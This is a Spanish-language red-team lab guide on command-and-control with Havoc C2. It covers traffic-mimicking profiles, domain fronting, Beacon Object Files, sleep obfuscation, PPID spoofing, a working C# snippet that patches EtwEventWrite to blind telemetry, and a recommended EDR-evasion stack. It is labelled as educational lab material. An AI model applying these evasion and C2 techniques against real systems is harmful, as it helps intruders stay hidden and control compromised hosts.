# Tradecraft — Operación DARK CURRENT
## Lab-10: C2 Avanzado, BOFs, Sleep Obfuscation y ETW Patching

**Operación:** DARK CURRENT | **Adversario:** Lazarus Group | **Nivel:** Red Team Operations  
**Autor:** Adrián Camacho | **Versión:** 1.0 | **Fecha:** Mayo 2026

---

## Índice

1. [Havoc C2 — Arquitectura y conceptos](#1-havoc-c2)
2. [Malleable C2 Profiles — Mimetizar tráfico legítimo](#2-malleable-c2-profiles)
3. [BOFs — Beacon Object Files](#3-bofs)
4. [Sleep Obfuscation — Cifrar el beacon en reposo](#4-sleep-obfuscation)
5. [ETW Patching — Cegar la telemetría del kernel](#5-etw-patching)
6. [Behavioural Detection — Qué buscan los EDRs modernos](#6-behavioural-detection)
7. [OPSEC — C2 avanzado en entornos con EDR activo](#7-opsec)

---

## 1. Havoc C2 — Arquitectura y conceptos

### ¿Por qué Havoc en lugar de Sliver?

Sliver es excelente para aprendizaje y laboratorios — API clara, bien documentado, fácil de usar. Havoc es más adecuado para engagements con EDR activo porque:

- Agente escrito en C (más difícil de detectar que Go/C#)
- Soporte nativo para BOFs
- Sleep obfuscation integrado
- Perfil de tráfico HTTP altamente personalizable
- Reflexive DLL loading del agente (no toca disco)

### Arquitectura de Havoc

```
Teamserver (Kali/VPS) ← HTTPS ← Demon (agente, en víctima)
       ↑
   Operator GUI
```

**Demon** es el agente de Havoc. Se genera como shellcode, DLL o ejecutable. En operaciones reales se usa siempre como shellcode inyectado en un proceso legítimo.

### Instalación y configuración básica

```bash
# Compilar Havoc
git clone https://github.com/HavocFramework/Havoc
cd Havoc
make ts-build   # teamserver
make client-build  # interfaz gráfica

# Configurar perfil (havoc.yaotl)
# Define listeners, agentes y perfiles de tráfico

# Iniciar teamserver
./havoc server --profile ./profiles/havoc.yaotl

# Iniciar cliente
./havoc client
```

### Generar un agente Demon

```
En Havoc GUI:
1. Payloads → Generate
2. Seleccionar listener
3. Format: Shellcode (para inyección)
4. Sleep: 60s (evitar detección por beaconing frecuente)
5. Jitter: 30% (variabilidad en el sleep)
```

---

## 2. Malleable C2 Profiles — Mimetizar tráfico legítimo

### ¿Qué es un C2 Profile?

Un C2 profile define exactamente cómo se ve el tráfico entre el agente y el teamserver. Sin perfil personalizado, el tráfico del C2 tiene patrones únicos que los proxies y EDRs detectan.

### Qué controla un C2 profile

```yaml
# Ejemplo de perfil Havoc (yaotl)
Listeners {
  Http {
    Name: "HTTPS Listener"
    Hosts: ["teamserver.example.com"]
    Port: 443
    Secure: true
    
    # Headers HTTP para parecer tráfico legítimo
    Headers {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
      "Accept-Language": "en-US,en;q=0.5"
      "Connection": "keep-alive"
    }
    
    # URLs que parecen legítimas
    Uris: ["/api/v1/update", "/static/assets/main.js", "/cdn/resource"]
  }
}
```

### Categorías de perfiles

| Perfil imita | Detección | Uso recomendado |
|-------------|-----------|-----------------|
| OneDrive API | Muy baja | Entornos con Microsoft 365 |
| Slack API | Baja | Empresas que usan Slack |
| jQuery CDN | Media | Uso general |
| Amazon S3 | Baja | Empresas con AWS |
| Google APIs | Muy baja | Uso general |

### Domain Fronting

Domain Fronting usa CDNs para ocultar el destino real del tráfico C2:

```
Agente → CDN (cloudfront.net) → Teamserver real
         ↑
    El proxy ve tráfico a amazon.cloudfront.net (legítimo)
    El tráfico real va a tu teamserver
```

Requiere que el CDN no verifique el header `Host`. Cloudfront, Fastly y Azure CDN han bloqueado esta técnica, pero algunos CDNs la siguen permitiendo.

---

## 3. BOFs — Beacon Object Files

### ¿Qué son los BOFs?

BOFs (Beacon Object Files) son pequeños programas en C compilados como object files (`.o`) que se ejecutan directamente en el contexto del proceso del beacon, sin crear nuevos procesos ni cargar DLLs adicionales.

### Por qué son superiores a ejecutar herramientas externas

| Ejecutar herramienta externa | BOF |
|------------------------------|-----|
| Crea nuevo proceso (detectable) | Se ejecuta en el proceso del beacon |
| El ejecutable toca disco | Solo el shellcode del BOF en memoria |
| Genera eventos 4688 | No genera eventos de proceso |
| Requiere upload y ejecución | Se envía directamente al beacon |

### BOFs disponibles en la comunidad

```bash
# TrustedSec BOF Collection
# - arp — ARP table enumeration
# - sc_query — Service Control Manager queries
# - tasklist — Lista de procesos sin crear proceso nuevo
# - whoami — Información del usuario actual
# - netstat — Conexiones de red activas

# SAP BOF
# - Kerberoasting via BOF (sin crear proceso externo)
# - DCSync via BOF

# Situational Awareness BOFs
# - adcs_enum — enumerar ADCS sin herramientas externas
# - ldapsearch — queries LDAP via BOF
```

### Desarrollar un BOF propio (conceptos básicos)

```c
// Un BOF es un object file C que usa la API de Beacon
#include <windows.h>
#include "beacon.h"

void go(char* args, int len) {
    // Beacon API para output
    BeaconPrintf(CALLBACK_OUTPUT, "Hello from BOF!\n");
    
    // Usar APIs de Windows directamente
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, 4);
    // ...
    
    BeaconPrintf(CALLBACK_OUTPUT, "Done\n");
}
```

```bash
# Compilar BOF
x86_64-w64-mingw32-gcc -o bof.o -c bof.c
```

---

## 4. Sleep Obfuscation — Cifrar el beacon en reposo

### El problema del beacon durmiendo

Cuando un beacon está en su intervalo de sleep, su código y configuración están en memoria sin cifrar. Los EDRs modernos escanean periódicamente todas las regiones de memoria en busca de patrones conocidos de beacons.

### Cómo funciona Sleep Obfuscation

```
Beacon activo
    ↓ antes de dormir:
    1. Cifra su propia memoria (XOR/AES con clave generada en runtime)
    2. Configura un timer para despertar en N segundos
    3. Elimina sus propias páginas de memoria de la lista de módulos
    ↓ sleep N segundos (memoria cifrada, indetectable)
    ↓ timer expira:
    1. Se descifra a sí mismo
    2. Continúa la ejecución normal
```

### Implementaciones disponibles

**Ekko** (C) — sleep obfuscation via ROP chain:
```
CreateTimerQueueTimer → QueueUserAPC → NtContinue → cifra/descifra memoria
→ no usa API directamente → difícil de detectar por hooks
```

**Zilean** (C) — sleep obfuscation via fibras:
```
ConvertThreadToFiber → cifra memoria → SwitchToFiber (espera) → descifra
```

**Foliage** — integrado en Havoc C2 como opción de compilación.

### Stack Spoofing durante el sleep

Además de cifrar la memoria, técnicas avanzadas falsifican el call stack durante el sleep para que las herramientas de análisis de stack vean una cadena de llamadas legítima en lugar de el beacon real.

---

## 5. ETW Patching — Cegar la telemetría del kernel

### ¿Qué es ETW?

ETW (Event Tracing for Windows) es el sistema de logging del kernel de Windows. Los EDRs se suscriben a eventos ETW para recibir telemetría en tiempo real:
- Creación de procesos
- Carga de módulos
- Acceso a archivos
- Operaciones de red
- Actividad de PowerShell (.NET runtime)

### ETW providers relevantes para Red Team

| Provider | GUID | Qué reporta |
|----------|------|-------------|
| Microsoft-Windows-DotNETRuntime | `e13c0d23-ccbc-4e12-931b-d9cc2eee27e4` | Ejecución de .NET, assemblies cargados |
| Microsoft-Antimalware-Scan-Interface | `2a576b87-09a7-520e-c21a-4942f0271d67` | Scans de AMSI |
| Microsoft-Windows-Kernel-Process | `22fb2cd6-0e7b-422b-a0c7-2fad1fd0e716` | Creación de procesos, threads |
| PowerShell | `a0c1853b-5c40-4b15-8766-3cf1c58f985a` | Comandos PowerShell ejecutados |

### Patching de ETW en .NET

```csharp
// Parchear EtwEventWrite en ntdll.dll para que no reporte eventos .NET
var ntdll = Process.GetCurrentProcess().Modules.Cast<ProcessModule>()
    .Where(m => m.ModuleName == "ntdll.dll").First();
var etwEventWrite = GetProcAddress(ntdll.BaseAddress, "EtwEventWrite");

// Escribir RET (0xC3) al inicio de la función → la función retorna inmediatamente
VirtualProtect(etwEventWrite, 4, PAGE_EXECUTE_READWRITE, out _);
Marshal.WriteByte(etwEventWrite, 0xC3);
```

### Limitaciones del ETW patching

- Requiere permisos de escritura en la memoria del proceso
- Modifica ntdll.dll en el proceso → detectable por integridad de módulos
- Solo afecta al proceso actual, no al sistema completo
- Kernel ETW (KEDT) no es parcheable desde userland

---

## 6. Behavioural Detection — Qué buscan los EDRs modernos

### Patrones de comportamiento que detectan los EDRs

| Patrón | Por qué es sospechoso |
|--------|----------------------|
| Process que se inyecta en otro proceso | Comportamiento de malware |
| Proceso sin módulo en disco (reflective) | Carga en memoria sin archivo |
| Thread con origen en heap (no en módulo) | Shellcode ejecutándose fuera de módulos |
| Proceso que abre handles a LSASS | Credential dumping |
| Conexión de red desde proceso que no debería | Beacon en proceso legítimo |
| Alto número de páginas RWX (Read-Write-Execute) | Shellcode preparado para ejecución |
| Call stack inconsistente | Manipulación del call stack |

### PPID Spoofing — Cambiar el proceso padre

Un proceso creado por un beacon hereda la reputación del proceso padre. Si el beacon crea procesos, el padre visible es el proceso del beacon (sospechoso). PPID Spoofing fuerza que el padre visible sea un proceso legítimo.

```
Sin PPID Spoofing:
  svchost.exe (con beacon) → cmd.exe (proceso creado por beacon)
  → EDR ve cmd.exe hijo de svchost.exe → sospechoso

Con PPID Spoofing:
  explorer.exe (padre ficticio) ← cmd.exe (proceso real)
  → EDR ve cmd.exe hijo de explorer.exe → normal
```

---

## 7. OPSEC — C2 avanzado en entornos con EDR activo

### Stack de evasión recomendado para Havoc

```
1. Agente como shellcode inyectado en proceso legítimo
2. Sleep obfuscation (Ekko/Foliage)
3. PPID Spoofing para procesos hijo
4. ETW patching para telemetría .NET
5. AMSI bypass si se ejecutan scripts PowerShell
6. Direct syscalls para operaciones sensibles
7. Perfil de tráfico que imita aplicación corporativa conocida
8. Jitter del 20-50% en el sleep interval
9. Sleep largo (5-15 minutos) cuando no hay actividad
```

### Métricas de detección

| Técnica de evasión | Reduce detección de |
|-------------------|-------------------|
| Sleep obfuscation | Escaneo de memoria en reposo |
| ETW patching | Telemetría .NET runtime |
| AMSI bypass | Detección de scripts PowerShell |
| Direct syscalls | API hooking por EDR |
| PPID Spoofing | Anomalías en árbol de procesos |
| Malleable profile | Detección de tráfico por patrones |
| BOFs | Creación de procesos sospechosos |

---

## Referencias

- [Havoc C2 GitHub](https://github.com/HavocFramework/Havoc)
- [Ekko Sleep Obfuscation](https://github.com/Crummie5/Ekko)
- [TrustedSec BOF Collection](https://github.com/trustedsec/CS-Situational-Awareness-BOF)
- [MITRE ATT&CK — Lazarus Group](https://attack.mitre.org/groups/G0032/)
- [MDSec — Sleeping with a Hooker](https://www.mdsec.co.uk/2022/07/sleeping-with-a-hooker-without-getting-caught/)

---

*Operación DARK CURRENT — Adrián Camacho | Mayo 2026*  
*Entorno de laboratorio — Únicamente con fines educativos*